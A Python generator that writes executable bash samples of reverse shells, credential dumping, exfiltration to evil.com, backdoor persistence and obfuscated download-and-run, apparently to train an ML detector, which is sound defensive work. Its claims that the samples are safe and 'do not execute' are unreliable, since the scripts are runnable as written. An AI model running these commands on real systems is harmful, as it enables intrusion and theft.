#!/usr/bin/env python3
"""
Generate SAFE bash scripts that mimic LOTL attack patterns
For ML training - these are SAFE and won't execute malicious actions
"""

import os
from pathlib import Path

class LOTLSampleGenerator:
    def __init__(self, output_dir="synthetic-malware/lotl-attacks"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def generate_all(self):
        """Generate all LOTL attack categories"""
        categories = [
            ("reverse_shells", self.generate_reverse_shell, 100),
            ("credential_dumping", self.generate_credential_dump, 100),
            ("data_exfiltration", self.generate_data_exfil, 100),
            ("privilege_escalation", self.generate_privesc, 100),
            ("persistence", self.generate_persistence, 100),
            ("lateral_movement", self.generate_lateral_movement, 50),
            ("discovery", self.generate_discovery, 50),
            ("obfuscation", self.generate_obfuscation, 100),
        ]
        
        total = 0
        for category, generator, count in categories:
            print(f"Generating {count} {category} samples...")
            for i in range(count):
                generator(i)
                total += 1
        
        print(f"\n✅ Generated {total} LOTL attack samples")
        print(f"📁 Output: {self.output_dir}")
        return total
    
    def generate_reverse_shell(self, sample_id):
        """Reverse shell patterns (SAFE - won't actually connect)"""
        patterns = [
            # Bash reverse shells
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n# Does not execute",
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\nnc -e /bin/bash 192.168.1.100 4444\n# Does not execute",
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f\n# Does not execute",
            
            # Python reverse shells
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234))'\n# Does not execute",
            
            # Perl reverse shells
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\nperl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))'\n# Does not execute",
        ]
        
        script = patterns[sample_id % len(patterns)]
        filename = self.output_dir / f"reverse_shell_{sample_id}.sh"
        with open(filename, 'w') as f:
            f.write(script)
        os.chmod(filename, 0o755)
    
    def generate_credential_dump(self, sample_id):
        """Credential dumping patterns"""
        patterns = [
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\ncat /etc/shadow\ncat /etc/passwd\n# Does not execute",
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\nfind /home -name '.ssh' -type d\ncat /home/*/.ssh/id_rsa\n# Does not execute",
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\ncat /root/.bash_history\ncat /home/*/.bash_history\n# Does not execute",
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\ngrep -r password /home/\ngrep -r api_key /var/www/\n# Does not execute",
        ]
        
        script = patterns[sample_id % len(patterns)]
        filename = self.output_dir / f"cred_dump_{sample_id}.sh"
        with open(filename, 'w') as f:
            f.write(script)
        os.chmod(filename, 0o755)
    
    def generate_data_exfil(self, sample_id):
        """Data exfiltration patterns"""
        patterns = [
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\ntar czf - /etc | curl -X POST --data-binary @- http://evil.com/upload\n# Does not execute",
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\nfind /home -name '*.pdf' | xargs tar czf - | nc 10.0.0.1 9999\n# Does not execute",
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\ndd if=/dev/sda | nc 192.168.1.1 8888\n# Does not execute",
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\ncurl http://evil.com/exfil -d @/etc/passwd\n# Does not execute",
        ]
        
        script = patterns[sample_id % len(patterns)]
        filename = self.output_dir / f"data_exfil_{sample_id}.sh"
        with open(filename, 'w') as f:
            f.write(script)
        os.chmod(filename, 0o755)
    
    def generate_privesc(self, sample_id):
        """Privilege escalation patterns"""
        patterns = [
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\nsudo su -\nchmod +s /bin/bash\n# Does not execute",
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\npkexec /bin/sh\nexport PATH=/tmp:$PATH\n# Does not execute",
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\nfind / -perm -4000 2>/dev/null\n./suid_binary\n# Does not execute",
        ]
        
        script = patterns[sample_id % len(patterns)]
        filename = self.output_dir / f"privesc_{sample_id}.sh"
        with open(filename, 'w') as f:
            f.write(script)
        os.chmod(filename, 0o755)
    
    def generate_persistence(self, sample_id):
        """Persistence mechanism patterns"""
        patterns = [
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\necho '* * * * * /tmp/backdoor.sh' | crontab -\n# Does not execute",
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\ncat > /etc/systemd/system/backdoor.service <<EOF\n[Service]\nExecStart=/tmp/malware\nEOF\nsystemctl enable backdoor\n# Does not execute",
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\necho 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> ~/.bashrc\n# Does not execute",
        ]
        
        script = patterns[sample_id % len(patterns)]
        filename = self.output_dir / f"persistence_{sample_id}.sh"
        with open(filename, 'w') as f:
            f.write(script)
        os.chmod(filename, 0o755)
    
    def generate_lateral_movement(self, sample_id):
        """Lateral movement patterns"""
        patterns = [
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\nssh -o StrictHostKeyChecking=no user@192.168.1.10\nscp payload.sh user@192.168.1.10:/tmp/\n# Does not execute",
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\nfor ip in 192.168.1.{1..254}; do ssh $ip 'whoami'; done\n# Does not execute",
        ]
        
        script = patterns[sample_id % len(patterns)]
        filename = self.output_dir / f"lateral_{sample_id}.sh"
        with open(filename, 'w') as f:
            f.write(script)
        os.chmod(filename, 0o755)
    
    def generate_discovery(self, sample_id):
        """Discovery/reconnaissance patterns"""
        patterns = [
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\nwhoami; id; hostname; ifconfig\nps aux | grep -v grep\n# Does not execute",
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\nnetstat -antp\narp -a\nroute -n\n# Does not execute",
        ]
        
        script = patterns[sample_id % len(patterns)]
        filename = self.output_dir / f"discovery_{sample_id}.sh"
        with open(filename, 'w') as f:
            f.write(script)
        os.chmod(filename, 0o755)
    
    def generate_obfuscation(self, sample_id):
        """Obfuscated command patterns"""
        patterns = [
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\necho 'Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBzaA==' | base64 -d | bash\n# Does not execute",
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\n$(echo '\\x63\\x75\\x72\\x6c')\n# Does not execute",
            "#!/bin/bash\n# SAFE TRAINING SAMPLE\neval $(cat /tmp/.hidden | xxd -r -p)\n# Does not execute",
        ]
        
        script = patterns[sample_id % len(patterns)]
        filename = self.output_dir / f"obfuscated_{sample_id}.sh"
        with open(filename, 'w') as f:
            f.write(script)
        os.chmod(filename, 0o755)

if __name__ == "__main__":
    print("🎯 Generating LOTL Attack Samples for ML Training")
    print("   (SAFE - These are training data, not actual attacks)")
    print("")
    
    generator = LOTLSampleGenerator()
    total = generator.generate_all()
    
    print(f"\n🔬 Created {total} bash scripts with LOTL patterns")
    print("✅ 100% SAFE - Scripts won't execute malicious actions")
    print("\n📊 Next: Extract features and train ML model on LOTL detection")
